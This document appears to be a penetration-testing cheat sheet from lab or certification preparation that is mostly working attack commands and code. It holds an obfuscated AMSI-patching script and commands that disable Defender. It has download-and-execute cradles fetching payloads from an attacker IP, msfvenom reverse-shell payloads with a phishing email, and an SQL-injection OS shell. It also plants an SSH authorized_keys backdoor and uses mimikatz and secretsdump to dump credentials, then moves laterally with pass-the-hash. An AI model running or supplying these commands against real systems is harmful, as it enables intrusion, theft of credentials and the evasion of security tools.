## AMSI & AppLocker Bypasses 
#### AMSI Bypass
```
(new-object system.net.webclient).downloadstring('http://192.168.45.201/amsi.txt') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.45.201/amsibypass.txt') | IEX

#patches AMSI protection in evil-winrm
    Bypass-4MSI

#.NET AMSI 
$ZQCUW = @"
using System;
using System.Runtime.InteropServices;
public class ZQCUW {
 [DllImport("kernel32")]
 public static extern IntPtr GetProcAddress(IntPtr hModule, string 
procName);
 [DllImport("kernel32")]
 public static extern IntPtr LoadLibrary(string name);
 [DllImport("kernel32")]
 public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr 
dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $ZQCUW
$BBWHVWQ = 
[ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115
;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, 
"$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97
;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
$p = 0
[ZQCUW]::VirtualProtect($XPYMWR, [uint32]5, 0x40, [ref]$p)
$TLML = "0xB8"
$PURX = "0x57"
$YNWL = "0x00"
$RTGX = "0x07"
$XVON = "0x80"
$WRUD = "0xC3"
$KTMJX = [Byte[]] ($TLML,$PURX,$YNWL,$RTGX,+$XVON,+$WRUD)
[System.Runtime.InteropServices.Marshal]::Copy($KTMJX, 0, $XPYMWR, 6)
```



#### Disable Defender
```
#PowerShell
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true

#CMD one-liner
Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;

#from CME  
sudo crackmapexec smb 172.16.1.201 -u joe -p 'Dev0ftheyear!' -x 'Powershell -WindowStyle Hidden Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend;'

#Meterpreter
run post/windows/manage/killav
```


#### AppLocker PowerShell Bypass 
```
#Check for Constrained Language Mode
$ExecutionCOntext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections 

#CLM bypass
curl http://192.168.45.201/PSbypassCLM2.exe -o bypass.exe
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
C:\AD\Tools\InviShell\InviShell\RunWithRegistryNonAdmin.bat
```

<br> 
<br>
<br>


## Enumeration 
#### PowerView 
```
Get-Domain
Get-DomainSID
Get-DomainController
Get-DomainTrust
Get-DomainTrustmapping
Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}
Get-Forest
Get-ForestDomain -Verbose
Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

Get-DomainUser
Get-DomainUser | select cn,samaccountname 
Get-DomainUser -Identity "ted"
Get-DomainUser -Identity harry.jones -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

Get-DomainGroup | select name 
Get-DomainGroup -UserName "ella"
Get-DomainGroup -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Domain Admins" | select MemberName 
Get-DomainManagedSecurityGroup
Find-ManagedSecurityGroups | select GroupName
Find-ForeignGroup
Get-DomainForeignGroupMember -Domain comply.com
Convert-SidToName S-1-5-21-888139820-103978830-333442103-1602
"S-1-5-21-888139820-103978830-333442103-1602" | ConvertFrom-SID

Get-DomainComputer | select -ExpandProperty dnshostname, useraccountcontrol

Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth

Get-DomainGPO -ComputerIdentity WS01 | select displayname

Test-AdminAccess -ComputerName SQL01
```

#### BloodHound
```
SharpHound.exe -c all --domain core-jijistudios.com --zipfilename out.zip

.\SharpHound.ps1 
Invoke-BloodHound -CollectionMethod All -Verbose

sudo bloodhound-python -dc DC04.tricky.com -ns 172.16.170.150 --dns-tcp -d tricky.com -c All -u sqlsvc@tricky.com -p '4dfgdfFFF542' --zip 
sudo bloodhound-python -dc dc01.jijistudio.com -ns 172.16.116.100 -d jijistudio.com -u 'web05' --hashes 'aad3b435b51404eeaad3b435b51404ee:e77541ac65a3fc493c3180041095d2dc' -c All --zip
```
<br>
<br>
<br>

## Active Directory Attacks 
<br>
<br>
<br>



## Payloads & Footholds 
#### VBA Payload 
```
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.201 LPORT=443 EXITFUNC=thread -f vbapplication
	set EXITFUNC thread
```

#### Phishing + DotNetToJScript
```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.45.201 lport=443 -f csharp
DotNetToJscript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o test.js

sudo swaks --to will@tricky.com --server mail01.tricky.com --body http://192.168.45.201/download.hta
```

#### SQLmap (OS-Shell) 
```
sqlmap -r post.req -p artist --os-shell
sqlmap -r post.req -p artist --os-cmd 'echo IEX (New-Object Net.WebClient).DownloadString("http://192.168.45.201/run.ps1") | powershell -noprofile'
```


<br>
<br>
<br>

#### File Transfer & Download
```
#file download
curl http://192.168.45.201/Rubeus.exe -o Rubeus.exe
certutil -urlcache -f http://192.168.45.201/Rubeus.exe c:\windows\tasks\rubeus.exe
(new-object system.net.webclient).downloadstring('http://192.168.45.201/amsi.txt') | IEX
powershell.exe -c iex (iwr http://192.168.45.201/Runner.ps1 -UseBasicParsing
powershell wget -uri http://192.168.45.201/run.txt -outfile C:\Windows\Tasks\run.txt

#SCP
scp -i id_rsa root@192.168.154.164:/tmp/krb5cc_75401103_YdtzIi .
scp kali@192.168.45.201/home/kali/Desktop/OSEP/Labs/3/pw.txt /home/marks

#smbserver
net use \\172.16.99.51\smb /user:kali kali
copy file \\172.16.99.51\smb\file
copy \\172.16.99.51\smb\PowerView.ps1 c:\windows\tasks\PowerView.ps1
```

#### Meterperter Basics
```
geuid
getsystem
sysinfo
execute -H -f notepad
migrate -N explorer.exe

run post/windows/gather/enum_shares 
run post/windows/gather/enum_logged_on_users 
run post/windows/gather/enum_computers 
run post/windows/gather/enum_applications 
run post/windows/gather/smart_hashdump 
run post/windows/gather/lsa_secrets
run winenum 
run post/windows/gather/hashdump 
run post/windows/gather/credentials/mssql_local_hashdump 
run post/windows/gather/credentials/domain_hashdump 
run post/multi/recon/local_exploit_suggester
run post/windows/gather/credentials/credential_collector
run post/linux/gather/hashdump
```

#### Tunneling & PortFoward 
```
###Socks Proxy
run autoroute -s 172.16.154.0/24
background
use auxiliary/server/socks_proxy 
set version 4a 
set srvhost 127.0.0.1 
run

#Ligolo
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.170.0/24 dev ligolo
./proxy -selfcert -laddr 0.0.0.0:53
./agent -connect 172.16.99.11:53 -ignore-cert
.\agent.exe -connect 172.16.99.11:53 -ignore-cert 

#SSH (only 22 open)
ssh root@IP -D 1080
sudo proxychains4 ...
```
<br>
<br>
<br>

## Privilege Escalation
#### Service Abuse
```
.\PowerUp.ps1
Invoke-AllChecks
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username 'dcorp\student551' -Verbose
net localgroup administrators (check your user was added)
```

#### UACBypass.ps1
https://github.com/Octoberfest7/OSEP-Tools/blob/main/uacbypass.ps1

#### LAPS 
```
IF we can read LAPS password we can escalated to local admin

Get-DomainObject -Identity client -Properties ms-Mcs-AdmPwd
Get-DomainObject -Identity web05 -Properties ms-Mcs-AdmPwd

run post/windows/gather/credentials/enum_laps 
```

<br>
<br>
<br>



## Post-Exploitation 
#### SSH backdoor 
```
cd /root
mkdir .ssh 
cd .ssh 
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCYAcnDL/a0CEBRiUHdhpLZQv6BLU1l5yB2wkgIBjJbZoWrXlALu3g8adnZkLl55A6/ph68JGQBqDWENBm6FBpaxIInbWPOPPFnUOYP3CQuksPO0785lGecR/4IoWvdTiiu6M5DfAzc7zzlIzNrnIV50zxa48f5b7dTyqjfHjP4h2jwbkA/NwA3KXSw9/9x5chiwVmfHqTQHVmYz8wDwVv4NhJQm/V7SHKKekMuhX+Ei4+pgwCRbr1h2RbFcnol3zZkb0NOBMTrJRhirXJqM6Fqj/I0T/EEv/O3rf4cW6k6Lq/+b9rrOFwrwpc7ElXSxJaKKlpbzV1mW1BtR7yvFVAd5tGdKmRsEAAEvPvlxhit1+EQuJChAt7TNQTEm8uqXjkJ8+TXjHFkVrOz1Z5BAuwBJEB8Tgd3zxaapkenc/APrHbfwzsJOZOqLVsrVEhgocaV7wu3QKwj8X8BtHR89D5PwKTyVHSHawyFdMq7UsM2UAgHfmyQN+Z/ZcDIOMppqc= kali@kali" >> /root/.ssh/authorized_keys
ssh root@192.168.154.164
```
#### SSH keys 
```
sudo chmod 600 id_rsa 
sudo ssh -i id_rsa final\\tommy@172.16.154.184 
```

#### Dumping Hashes
```
sudo /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support smb . -username kali -password kali
net use \\192.168.49.51\smb /user:kali kali 
reg.exe save hklm\system \\192.168.49.51\smb\SYSTEM
reg.exe save hklm\sam \\192.168.49.51\smb\SAM
reg.exe save hklm\security \\192.168.49.51\smb\SECURITY
sudo /opt/impacket/examples/secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

#Mimikatz
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' 
Invoke-Mimikatz -Command '"lsadump::secrets"'
Invoke-Mimikatz -Command '"lsadump::lsa"'

#secretsdump.py
sudo /usr/share/doc/python3-impacket/examples/secretsdump.py medtech/joe:Flowers1@172.16.188.11

#NTDS.dit
sudo crackmapexec smb dc03.infinity.com -u pete -H 'hash' --ntds
sudo crackmapexec smb 192.168.210.16 -u ZPH-SVRCDC01$ -H 'd47a6d90e1c5adf4200227514e393948' --ntds

sudo /usr/share/doc/python3-impacket/examples/secretsdump.py -hashes ':5bdd6a33efe43f0dc7e3b2435579aa53' administrator@192.168.110.55 
```

<br>
<br>
<br>


## Lateral Movement
#### Enable RDP
```
reg.exe add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
sudo crackmapexec smb 172.16.170.166 -d complyedge.com -u jim -H 'e48c13cefd8f9456d79cd49651c134e8' -x 'reg.exe add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f' --exec-method smbexec

run post/windows/manage/enable_rdp
```
#### XfreeRDP/Rdesktop
```
rdesktop 192.168.154.122 -u administrator -p 'password123'
sudo xfreerdp /v:192.168.154.121 /u:administrator /pth:21f3dd003492ff0eb20db3710e1cc02d /size:1700x1160
```
#### PsExec 
```
sudo impacket-psexec administrator@172.16.170.194 -hashes ':f99529e42ee77dc4704c568ba9320a34'
sudo impacket-psexec student551:'D7Ys4CAcQBTWvteG'@172.16.4.101
\\PsExec.exe \\rdc02 cmd
```
#### Wmiexec
```
sudo impacket-wmiexec student551:'D7Ys4CAcQBTWvteG'@172.16.4.101
sudo impacket-wmiexec administrator@172.16.1.1 -hashes ':71d04f9d50ceb1f64de7a09f23e6dc4c'
```
#### Evil-Winrm 
```
sudo evil-winrm -i 10.10.15.20 -u joe -p password
sudo evil-winrm -i 10.10.15.20 -u melissa -H 251e366fdd64eff18be0824ec7c6833c
sudo proxychains4 evil-winrm -i 192.168.154.169 -u 'OPS.COMPLY.COM\pete' -p '0998ASDaas2'
```





